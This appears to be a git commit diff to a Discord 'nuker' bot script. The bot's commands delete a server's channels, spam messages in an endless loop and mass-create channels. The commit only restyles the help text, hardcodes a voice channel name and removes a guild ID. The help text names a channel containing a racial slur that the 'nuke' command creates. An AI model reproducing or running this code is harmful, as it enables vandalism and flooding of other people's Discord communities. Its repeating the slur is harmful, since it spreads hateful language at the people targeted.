d7829fa6c3b72b92a50c54379c689ef9b2105c13
PewFam <106314076+PewFam@users.noreply.github.com>
2022-08-14 14:19:54 +0200

    Update basicnuker.py

--- basicnuker.py
+++ basicnuker.py
@@ -37,13 +37,13 @@ async def on_ready():
 async def help(ctx):
   await ctx.send("~Bot~")
   await ctx.send("_**Default Prefix: # **_")
-  await ctx.send("~1~ clear - clears da channel")
-  await ctx.send(r'~2~ nuke - nukes the server and adds a new channel "#nigger ?"')
-  await ctx.send("~3~ special - nukes the server and adds a new channel 'whateveryouwant' = ex: #special ligma+balls")
-  await ctx.send("~4~ spam - spams messages = example: #spam huh_?")
-  await ctx.send("~6~ spamchannel - spams channels = ex: #spamchannel omg 10")
-  await ctx.send("~7~ create a vocal channel ex: #vocal hey 1")
-  await ctx.send("~8~ nukes & makes a simple server model")
+  await ctx.send("~1~ **clear** - clears da channel")
+  await ctx.send(r'~2~ _**nuke**_ - nukes the server and adds a new channel "#nigger ?"')
+  await ctx.send("~3~ **special** - nukes the server and adds a new channel 'whateveryouwant' = ex: #special ligma+balls")
+  await ctx.send("~4~ **spam** - spams messages = example: #spam huh_?")
+  await ctx.send("~6~ **spamchannel** - spams channels = ex: #spamchannel omg 10")
+  await ctx.send("~7~ **vocal** - create a vocal channel ex: #vocal hey 1")
+  await ctx.send("~8~ **auto** - nukes & makes a simple server model")
   await ctx.send("**Spaces are __+__**")
 
   
@@ -74,10 +74,10 @@ async def special(ctx,channeladd):
 async def spam(ctx, spamtext):
   while 1:await ctx.send(str(spamtext).replace("+"," "))
 @bot.command()
-async def vocal(ctx, voice, amount):
+async def vocal(ctx,voice,amount):
   guild = ctx.guild
   for i in range(int(amount)):
-      await guild.create_voice_channel(str(voice.replace("+", " ")))
+      await guild.create_voice_channel('voc')
 @bot.command()
 async def auto(ctx):
     try:
@@ -86,7 +86,7 @@ async def auto(ctx):
           try:
             await channel.delete()
           except:pass
-        guild = bot.get_guild(997147032760365086) # <-- insert yor guild id here
+        guild = bot.get_guild() # <-- insert yor guild id here
         
         category = await guild.create_category("Terminal", overwrites=None, reason=None)
         await guild.create_text_channel('welcome+!', overwrites=None, category=category, reason=None)
